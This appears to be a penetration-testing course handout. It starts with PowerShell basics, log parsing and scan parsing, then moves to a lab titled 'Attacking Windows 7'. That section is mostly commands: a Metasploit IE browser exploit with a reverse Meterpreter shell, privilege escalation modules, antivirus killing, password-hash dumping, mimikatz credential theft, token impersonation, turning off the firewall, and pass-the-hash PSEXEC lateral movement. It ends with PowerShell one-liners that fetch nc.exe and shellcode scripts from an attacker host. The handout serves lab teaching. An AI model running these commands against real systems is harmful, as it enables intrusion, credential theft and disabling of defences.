#######################
# VMs for this course #
#######################
https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
	username: workshop
	password: password
	
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user:      infosecaddicts
pass:      infosecaddicts

You don't have to, but you can do the updates in the Win7 VM (yes, it is a lot of updates).

You'll need to create directory in the Win7 VM called "c:\ps"

In this file you will also need to change the text '192.168.11.129' to the IP address of your Ubuntu host.




If you are interested in running PowerShell on Mac OS X, or Linux you can check out the following link:
https://www.howtogeek.com/267858/how-to-install-microsoft-powershell-on-linux-or-os-x/

#####################
# Powershell Basics #
#####################

PowerShell is Microsoft's new scripting language that has been built in since the release Vista. 

PowerShell file extension end in .ps1 . 

An important note is that you cannot double click on a PowerShell script to execute it. 

To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.

------------------------Type This------------------------------
cd c:\
dir 
cd 
ls
---------------------------------------------------------------


To obtain a list of cmdlets, use the Get-Command cmdlet
------------------------Type This------------------------------
Get-Command
--------------------------------------------------------------- 


You can use the Get-Alias cmdlet to see a full list of aliased commands.
------------------------Type This------------------------------
Get-Alias
---------------------------------------------------------------


Don't worry you won't blow up your machine with Powershell
------------------------Type This------------------------------
Get-Process | stop-process 				Don't press [ ENTER ] What will this command do?
Get-Process | stop-process -whatif
---------------------------------------------------------------

To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
------------------------Type This------------------------------
Get-Help Get-Command

Get-Help Get-Service –online

Get-Service -Name TermService, Spooler

Get-Service –N BITS
---------------------------------------------------------------





- Run cmdlet through a pie and refer to its properties as $_
------------------------Type This------------------------------
Get-Service | where-object {  $_.Status -eq "Running"}
---------------------------------------------------------------



- PowerShell variables begin with the $ symbol. First lets create a variable
------------------------Type This------------------------------
$serv = Get-Service –N Spooler
---------------------------------------------------------------

To see the value of a variable you can just call it in the terminal.
------------------------Type This------------------------------
$serv

$serv.gettype().fullname
---------------------------------------------------------------
 

Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
------------------------Type This------------------------------
$serv | Get-Member

Get-Member -InputObject $serv
---------------------------------------------------------------
 



Let's use a method and a property with our object. 
------------------------Type This------------------------------
$serv.Status
$serv.Stop()
$serv.Refresh()
$serv.Status
$serv.Start()
$serv.Refresh()
$serv.Status
---------------------------------------------------------------
 

If you want some good command-line shortcuts you can check out the following link:
https://technet.microsoft.com/en-us/library/ff678293.aspx

#############################
# Simple Event Log Analysis #
#############################

Step 1: Dump the event logs
---------------------------
The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.

To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs. 
If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
------------------------Type This------------------------------
Get-EventLog -LogName application | Export-Clixml Applog.xml

type .\Applog.xml

$logs = "system","application","security"
---------------------------------------------------------------


The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
------------------------Type This------------------------------
$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
---------------------------------------------------------------




Step 2: Import the event log of interest
----------------------------------------
To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files. 
Store the results in a variable. 
Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object. 

The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
------------------------Type This------------------------------
$seclog = Import-Clixml security.xml

$seclog | select -Last 5
---------------------------------------------------------------

Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
------------------------Type This------------------------------
Get-EventLog Application -After (Get-Date).AddDays(-1)
---------------------------------------------------------------
You can use '-after' and '-before' to filter date ranges

One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything. 
By default, an ordinary user does not have permission to read the security log. 




Step 3: Drill into a specific entry
-----------------------------------
To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties. 

------------------------Type This------------------------------
$seclog | select -first 1 | fl *
---------------------------------------------------------------

The message property contains the SID, account name, user domain, and privileges that are assigned for the new login. 

------------------------Type This------------------------------
($seclog | select -first 1).message

(($seclog | select -first 1).message).gettype()
---------------------------------------------------------------


In the *nix world you often want a count of something (wc -l). 
How often is the SeSecurityPrivilege privilege mentioned in the message property? 
To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
------------------------Type This------------------------------
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
---------------------------------------------------------------
If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property. 

------------------------Type This------------------------------
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
---------------------------------------------------------------

Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present. 
Use the count property to determine the total number of entries in the event log.
------------------------Type This------------------------------
$seclog.Count
---------------------------------------------------------------





############################
# Simple Log File Analysis #
############################


You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA

------------------------Type This------------------------------
mkdir c:\ps
cd c:\ps
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt 
---------------------------------------------------------------



The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
------------------------Type This------------------------------
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
---------------------------------------------------------------



To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
------------------------Type This------------------------------
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
---------------------------------------------------------------


To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output. 
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
---------------------------------------------------------------


Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses. 
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
---------------------------------------------------------------

In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
---------------------------------------------------------------



##############################################
# Parsing Log files using windows PowerShell #
##############################################

Download the sample IIS log http://pastebin.com/LBn64cyA 

------------------------Type This------------------------------
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")

Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
---------------------------------------------------------------


The above command would give us all the WebDAV requests.

To filter this to a particular user name, use the below command:
------------------------Type This------------------------------
Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
---------------------------------------------------------------
 

Some more options that will be more commonly required : 

For Outlook Web Access : Replace WebDAV with OWA 

For EAS : Replace WebDAV with Microsoft-server-activesync 

For ECP : Replace WebDAV with ECP

 





####################################################################
# Windows PowerShell: Extracting Strings Using Regular Expressions #
####################################################################


Regex Characters you might run into:

^	Start of string, or start of line in a multiline pattern
$	End  of string, or start of line in a multiline pattern
\b	Word boundary
\d	Digit
\	Escape the following character
*	0 or more	{3}	Exactly 3
+	1 or more	{3,}	3 or more
?	0 or 1		{3,5}	3, 4 or 5



To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:

1) The input file that will be parsed
------------------------Type This------------------------------
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
---------------------------------------------------------------
2) The regular expression that the input file will be compared against

3) The output file for where the extracted data will be placed.

Windows PowerShell has a "select-string" cmdlet which can be used to quickly scan a file to see if a certain string value exists. 
Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.

To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
------------------------Type This------------------------------
$input_path = 'c:\ps\emails.txt'
$output_file = 'c:\ps\extracted_addresses.txt'
$regex = '\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------


In this script, we have the following variables:

1) $input_path to hold the path to the input file we want to parse

2) $output_file to hold the path to the file we want the results to be stored in

3) $regex to hold the regular expression pattern to be used when the strings are being matched.

The select-string cmdlet contains various parameters as follows:

1) "-Path" which takes as input the full path to the input file

2) "-Pattern" which takes as input the regular expression used in the matching process

3) "-AllMatches" which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to "$.Matches" and then "$_.Value" which represent using the current values of all the matches.

Using ">" the results are written to the destination specified in the $output_file variable.

Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.

IP addresses
------------
For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
------------------------Type This------------------------------
$input_path = 'c:\ps\ip_addresses.txt'
$output_file = 'c:\ps\extracted_ip_addresses.txt'
$regex = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------



URLs
----
For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt. 
You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
------------------------Type This------------------------------
$input_path = 'c:\ps\URL_addresses.txt'
$output_file = 'c:\ps\extracted_URL_addresses.txt'
$regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------

In addition to the examples above, many other types of strings can be extracted using this script. 
All you need to do is switch the regular expression in the "$regex" variable! 
In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.






########################################
# Basic Network Commands in PowerShell #
########################################

Reference:
https://blogs.technet.microsoft.com/josebda/2015/04/18/windows-powershell-equivalents-for-common-networking-commands-ipconfig-ping-nslookup/


###################
# Pentester Tasks #
###################
Reference:
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx


Listing IPs
-----------
One of the typical ways for working with IP addressed in most scripts is to work with an octet and then increase the last one

------------------------Type This------------------------------
$octect = "192.168.11."
$lastoctect = (1..255)
$lastoctect | ForEach-Object {write-host "$($octect)$($_)"}
---------------------------------------------------------------


Ping Sweep
------------------------------------------------------
PowerShell provides several methods for doing Ping
Test-Connection cmdlet
Creation of a WMI Object
.Net System.Net.NetworkInformation.Ping Object
------------------------------------------------------


------------------------Type This------------------------------
function New-IPRange ($start, $end) {
$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
[Array]::Reverse($ip1)
$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address

$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
[Array]::Reverse($ip2)
$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address

for ($x=$ip1; $x -le $ip2; $x++) {
$ip = ([System.Net.IPAddress]$x).GetAddressBytes()
[Array]::Reverse($ip)
$ip -join '.'
}
}
$ping = New-Object System.Net.NetworkInformation.Ping
New-IPRange 192.168.11.1 192.168.11.150 | ForEach-Object {$ping.Send($_, 100)} | where {$_.status -eq "Success"}
---------------------------------------------------------------


Reverse Lookups
---------------
For reverse lookups using .Net Class we use the [System.Net.Dns]::GetHostEntry(IP) method Returns System.Net.IPHostEntry


------Deprecated--------
[System.Net.Dns]::GetHostByAddress("162.243.126.247")   
------Deprecated--------

Use getnameinfo instead:
https://msdn.microsoft.com/en-us/library/windows/desktop/ms738532(v=vs.85).aspx

References:
https://stackoverflow.com/questions/10346194/how-to-use-getnameinfo-instead-of-gethostbyname



Forward Lookups
---------------

------------------------Type This------------------------------
[System.Net.Dns]::GetHostAddresses("www.google.com")
---------------------------------------------------------------


Port Scans
----------
To test if a port is open on a remote host in PowerShell the best method is to use the .Net abstraction that it provides to Windows Socket library
For TCP the .Net System.Net.Sockets.TcpClient
For UDP the .Net System.Net.Sockets.UdpClient




TCP Scan
--------

------------------------Type This------------------------------
$ports=22,80,443,3389
$target = "192.168.11.129"
foreach ($i in $ports) {
try {
$socket = new-object System.Net.Sockets.TCPClient($target, $i);
} catch {}
if ($socket -eq $NULL) {
echo "$target:$i - Closed";
} else {
echo "$target:$i - Open";
$socket = $NULL;
}}
---------------------------------------------------------------




##########################
# Parsing Nmap XML Files #
##########################
If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip




Run Powershell as administrator
------------------------Type This------------------------------
cd C:\

Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted –Force
---------------------------------------------------------------


Parse nmap XML
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml
---------------------------------------------------------------


Process all XML files
------------------------Type This------------------------------
.\parse-nmap.ps1 *.xml
---------------------------------------------------------------

Piping also works
------------------------Type This------------------------------
dir *.xml | .\parse-nmap.ps1
---------------------------------------------------------------

Advanced parsing with filtering conditions
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
---------------------------------------------------------------


More parsing
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
---------------------------------------------------------------

Parsing with match and multiple conditions
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
---------------------------------------------------------------


CSV Export
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
---------------------------------------------------------------

Import Data from CSV
------------------------Type This------------------------------
$data = import-csv weblisteners.csv
$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
---------------------------------------------------------------


Export to HTML
------------------------Type This------------------------------
.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
---------------------------------------------------------------


########################################
# Parsing Nessus scans with PowerShell #
########################################
If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip



Let's take a look at the Import-Csv cmdlet and what are the members of the object it returns:
------------------------Type This------------------------------
Import-Csv C:\class_nessus.csv | Get-Member
---------------------------------------------------------------

filter the objects:

------------------------Type This------------------------------
Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"}
---------------------------------------------------------------

use the Select-Object cmdlet and only get unique entries:
------------------------Type This------------------------------
Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique

Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
------------------------Type This------------------------------
 
ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
------------------------Type This------------------------------
Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
---------------------------------------------------------------




#####################################################
# Analyzing Macro Embedded Malware                  #
# Reference:                                        #
# https://jon.glass/analyzes-dridex-malware-p1/     #
#####################################################

Use the InfoSec Addicts virtual machine:
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user:      infosecaddicts
pass:      infosecaddicts


------------------------Type This------------------------------
sudo pip install olefile
     infosecaddicts
 
mkdir ~/Desktop/oledump
 
cd ~/Desktop/oledump

wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
 
unzip oledump_V0_0_22.zip
 
wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
 
unzip 064016.zip
     infected
 
python oledump.py 064016.doc
 
python oledump.py 064016.doc -s A4 -v
---------------------------------------------------------------
 
- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
- Three of the data streams are flagged as macros: A3:'VBA/Module1′, A4:'VBA/Module2′, A5:'VBA/ThisDocument'.
 
------------------------Type This------------------------------
python oledump.py 064016.doc -s A5 -v
---------------------------------------------------------------
 
- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
 
------------------------Type This------------------------------
python oledump.py 064016.doc -s A3 -v
---------------------------------------------------------------
 
- Look for "GVhkjbjv" and you should see:
 

 
- Take that long blob that starts with 636D and finishes with 653B and paste it in:
http://www.rapidtables.com/convert/number/hex-to-ascii.htm







############################################
# Introduction to scripting and toolmaking #
############################################
https://www.youtube.com/watch?v=usiqXcWb978

Start the ISE


CTRL+R








Get-EventLog -LogName application


------------------------------------------------------------------------------------------------
--- Now run the script ---

.\GrabLogs.ps1


------------------------------------------------------------------------------------------------



$LogName="application"
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml




--- Now run the script ---

.\GrabLogs.ps1


------------------------------------------------------------------------------------------------


param(
    $LogName="application"
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml



--- Now run the script ---

.\GrabLogs.ps1


------------------------------------------------------------------------------------------------
--- Now run the script ---

.\GrabLogs.ps1 -L[ TAB Key ]

.\GrabLogs.ps1 -LogName 		(you should now see LogName spelled out)


.\GrabLogs.ps1 -LogName system


------------------------------------------------------------------------------------------------



param(
    $LogName="application",
    $HackCon
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml



------------------------------------------------------------------------------------------------
--- Now run the script ---

.\GrabLogs.ps1 -H[ TAB Key ]

.\GrabLogs.ps1 -HackCon 		(you should now see HackCon spelled out)




------------------------------------------------------------------------------------------------
--- Now get help on the script ---

get-help .\GrabLogs.ps1
GrabLogs.ps1 [[-LogName] <Object>] [[-HackCon] <Object>]




------------------------------------------------------------------------------------------------
param(
    [string]$LogName="application",
    $HackCon
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml



------------------------------------------------------------------------------------------------
--- Now get help on the script ---

get-help .\GrabLogs.ps1
GrabLogs.ps1 [[-LogName] <String>] [[-HackCon] <Object>]




------------------------------------------------------------------------------------------------
param(
    [string[]]$LogName="application",
    $HackCon
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml



------------------------------------------------------------------------------------------------
--- Now get help on the script ---

get-help .\GrabLogs.ps1
GrabLogs.ps1 [[-LogName] <String[]>] [[-HackCon] <Object>]



------------------------------------------------------------------------------------------------
[CmdletBinding()]
param(
    [Parameter(Mandatory=$True)]
    $LogName
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml



------------------------------------------------------------------------------------------------
--- Now run the script ---

.\GrabLogs.ps1 





------------------------------------------------------------------------------------------------
[CmdletBinding()]
param(
    [Parameter(Mandatory=$True)]
    $LogName
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml





------------------------------------------------------------------------------------------------
<#

.Synopsis
This is a just a short explantion of the script

.Description
This is where provide a more information about how to use the script

.Parameter LogName
This is where you specify the names of different logs

./Syntax
GrabLogs.psl -LogName security


.Example
GrabLogs.psl -LogName security


#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$True)]
    $LogName
)
Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml




------------------------------------------------------------------------------------------------
--- Now get help on the script ---

get-help .\GrabLogs.ps1






------------------------------------------------------------------------------------------------
--- Now get help on the script ---
get-help .\GrabLogs.ps1 -full







<#

.Synopsis
This is a just a short explantion of the script

.Description
This is where provide a more information about how to use the script

.Parameter LogName
This is where you specify the names of different logs

./Syntax
GrabLogs.psl -LogName security


.Example
GrabLogs.psl -LogName security


#>
function Get-GrabLogs{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        $LogName
    )
    Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
}

#######################
# Attacking Windows 7 #
#######################
NOTE: You'll be using your Ubuntu Linux host as the attacker machine in this lab
------------------------Type This------------------------------
sudo /sbin/iptables -F
	infosecaddicts
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST InfoSecAddictsVM                                            
 
exploit -j
--------------------------------------------------------------- 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://infosecaddicts-VM-IP:8080/ie8                                            
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
------------------------Type This------------------------------ 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
------------------------Type This------------------------------ 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST infosecaddicts-VM-IP                                            
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop

meterpreter > getsystem
...got system (via technique 1).


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 

meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump

meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** FIX PSEXEC **********************************
 
- We use the shell command to get to the Victim Dos command so we can add a registry field.
------------------------Type This------------------------------ 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
------------------------Type This------------------------------ 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1


c:\Windows\system32> netsh advfirewall set allprofiles state off

********************************** Lateral Movement *******************************


Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec

set SMBUser Workshop
 
set SMBPass password
 
set RHOST Win7-VM-IP

set payload windows/meterpreter/reverse_tcp
 
set LHOST infosecaddicts-VM-IP
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST Win7-VM-IP                      
 
set LHOST infosecaddicts-VM-IP
 
set LPORT 5678
 
exploit
####################################################
# Running Powershell From A Command Prompt         #
# Using Powersploit & Nishang			           #
####################################################

COMMAND & 1 PARAMATER SYNTAX:		
	powershell -command "& {&'some-command' someParam}"



MULTIPLE COMMAND & PARAMETER SYNTAX
	powershell -command "& {&'some-command' someParam}"; "& {&'some-command' -SpecificArg someParam}"



Tools to download to the web root (/var/www) of your infosecaddicts-Ubuntu-VM:
git clone https://github.com/mattifestation/PowerSploit.git
git clone https://github.com/samratashok/nishang

from the infosecaddicts home dir copy nc.exe to /var/www/ folder

user:infosecaddicts
pass:infosecaddicts

------------------------Type This------------------------------
cd ~
sudo cp nc.exe /var/www/

cd /var/www/html/
sudo git clone https://github.com/samratashok/nishang
sudo git clone https://github.com/mattifestation/PowerSploit


********************************** Simple Ping Sweep **********************************
powershell -command "50..100 | % {\""192.168.11.$($_): $(Test-Connection -count 1 -comp 192.168.11.$($_) -quiet)\""}"





********************************** Simple Port 445 Sweep **********************************
powershell -command "1..255 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.11.$_\"",445)) \""192.168.11.$_\""} 2>$null"






********************************** Simple Port Scan **********************************
powershell -command "1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.11.XX\"",$_)) \""$_ is open\""} 2>$null"






********************************** Download a file **********************************
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.11.129/nc.exe', 'nc.exe')"





********************************** Downloading files: Binaries **********************************
powershell -command "(New-ObjectSystem.Net.WebClient).DownloadFile("http://192.168.11.129/nc.exe","c:\nc.exe")" 





********************************** Text file stdout to local file  **********************************
(New-Object System.Net.WebClient).DownloadString("http://192.168.11.129/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") | Out-File -Encoding ASCII Invoke-Shellcode.ps1 




********************************** Powershell Download & Execute Reverse Meterpreter **********************************
from ubuntu host browse to metasploit folder 
cd ~/toolz/metasploit/

